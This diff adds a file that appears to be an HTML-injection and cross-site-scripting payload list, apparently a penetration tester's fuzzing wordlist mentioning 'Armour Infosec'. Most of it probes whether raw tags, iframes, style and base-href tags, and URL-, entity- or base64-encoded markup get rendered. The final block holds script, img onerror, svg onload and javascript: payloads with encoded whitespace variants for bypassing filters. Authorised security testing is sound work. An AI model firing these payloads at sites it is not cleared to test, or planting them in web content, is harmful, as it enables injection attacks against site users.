@@ -1,0 +1,121 @@
+<h1>HTML</h1>
+<h1>html</h1>
+<h2>HTML</h2>
+<h3>HTML</h3>
+<h4>HTML</h4>
+<h5>HTML</h5>
+<h6>HTML</h6>
+<pre>HTML</pre>
+<p>HTML</p>
+<i>HTML</i>
+<a href="https://www.google.com">HTML</a>
+<abbr title="HTML">HTML</abbr>
+<acronym title="Armour Infosec">AI</acronym>
+<address>address,address</address>
+<article><h2>Armour Infosec</h2></article>
+<audio controls><source src="demo.ogg" type="audio/ogg"><source src="demo.mp3" type="audio/mpeg"></audio>
+<b>HTML</b>
+<h1>HTML</h1><!--
+qq<h1>HTML</h1>
+qq<h1>HTML</h1>qq
+$$\<u>HTML</u>{}$$
+%3Ch1%3EHTML%3C%2Fh1%3E
+&lt;h1&gt;HTML&lt;/h1&gt;
+&#60;h1&#62;HTML&#60;/h1&#62;
+<iframe src="https://www.google.com" title="test"></iframe>
+123<h1>HTML</h1>
+<h1>HTML</h1>123
+123<h1>HTML</h1>123
+%253Ch1%253EHTML%253C%252Fh1%253E
+<iframe id="if1" src="https://www.google.com"></iframe>
+<iframe id="if2" src="https://www.google.com"></iframe>
+PGgxPkhUTUw8L2gxPg==
+UEdneFBraFVUVXc4TDJneFBnPT0=
+<<h1>HTML</h1>
+<<h1>HTML</h1>>
+<<h1>html</h1>>
+%253Ch1%253EHTML%253C%252Fh1%253E<h1>Html</h1>
+<pre>HTML</pre>
+<p>HTMLinjection here</p>
+<i>HTML</i>
+<u>Html</u>
+<mark>Html</mark>
+<a href="https://www.google.com">HTML</a>
+<b>HTML</b>
+<h1>HTML</h1><!--
+qq<h1>HTML</h1>
+qq<h1>HTML</h1>qq
+%3Ch1%3EHTML%3C%2Fh1%3E
+%253Ch1%253EHTML%253C%252Fh1%253E
+&lt;h1&gt;HTML&lt;/h1&gt;
+&amp;lt;h1&amp;gt;HTML&amp;lt;/h1&amp;gt;
+&#60;h1&#62;HTML&#60;/h1&#62;
+<iframe src="https://www.google.com" title="test"></iframe>
+123<h1>HTML</h1>
+<h1>HTML</h1>123
+123<h1>HTML</h1>123
+%253Ch1%253EHTML%253C%252Fh1%253E
+<iframe id="if1" src="https://www.google.com"></iframe>
+<iframe id="if2" src="https://www.google.com"></iframe>
+<<h1>HTML</h1>
+<<h1>HTML</h1>>
+<<h1>html</h1>>
+%253Ch1%253EHTML%253C%252Fh1%253E
+<div>HTML</div>
+%3Ci%3Ehtml%3C%2Fi%3E
+%253Ci%253Ehtml%253C%252Fi%253E
+<style>h1 {color:red;}</style><h1>This is a heading</h1>
+<textarea id="HTML" name="HTML" rows="4" cols="50">Html injected</textarea>
+<head><base href="https://www.google.com" target="_blank"></head>
+<span style="color:blue;font-weight:bold">html</span>
+<abbr title="HTML">HTML</abbr>
+<acronym title="Armour Infosec">AI</acronym>
+<address>address,address</address>
+<article><h2>Armour Infosec</h2></article>
+<audio controls><source src="demo.ogg" type="audio/ogg"><source src="demo.mp3" type="audio/mpeg"></audio>
+<bdi>Html</bdi>injection
+<bdo dir="rtl">HTML html</bdo>
+<blockquote cite="http://google.com">HTML Injection</blockquote>
+<body><h1>HTML html</h1></body>
+Html<br>line breaks<br>injection
+<button type="button">Click Me!</button>
+<canvas id="myCanvas">draw htmli</canvas>
+<caption>Html</caption>
+<cite>Html Html</cite>
+<code>Html</code>
+<colgroup><col span="2" style="background-color:red"></colgroup>
+<data value="21053">test html</data>
+<datalist id="html"><option value="html"></datalist>
+<dl><dt>Html</dt></dl>
+<dt>Html</dt>
+<dd>Html</dd>
+<del>Html</del>
+<ins>Html</ins>
+<details><summary>HTML</summary><p>html html</p></details>
+<dfn>HTML</dfn>
+<dialog open>Html</dialog>
+<dialog close></dialog>
+<em>Html</em>
+<embed type="text/html" src="index.html" width="500" height="200">
+<fieldset><legend>hello:</legend><label for="fname">First name:</label><input type="text"id="fname"name="fname"><br><br><input type="submit"value="Submit"></fieldset>
+&lt;h1&gt;HTML&lt;/h1&gt;
+&lt;script&gt;alert('HTML Injection')&lt;/script&gt;
+&lt;img src=x onerror=alert('HTML Injection')&gt;
+&lt;svg onload=alert('HTML Injection')&gt;
+&lt;a href="javascript:alert('HTML Injection')"&gt;Click Me&lt;/a&gt;
+&lt;iframe src="javascript:alert('HTML Injection')"&gt;&lt;/iframe&gt;
+&lt;img src=x:x onerror=alert('HTML Injection')&gt;
+&lt;img src=x:x&#32;onerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%0Aonerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%0D%0Aonerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%09onerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%0Conerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%26Tab;onerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%26NewLine;onerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%26%23x000a;onerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%26%23x000d%26%23x000a;onerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%26%23x0009;onerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%26%23x000b;onerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%26Tab;onerror=alert('HTML Injection')&gt;
+&lt;img src=x:x%26%23x000a;onerror=alert('HTML Injection')&gt;
+
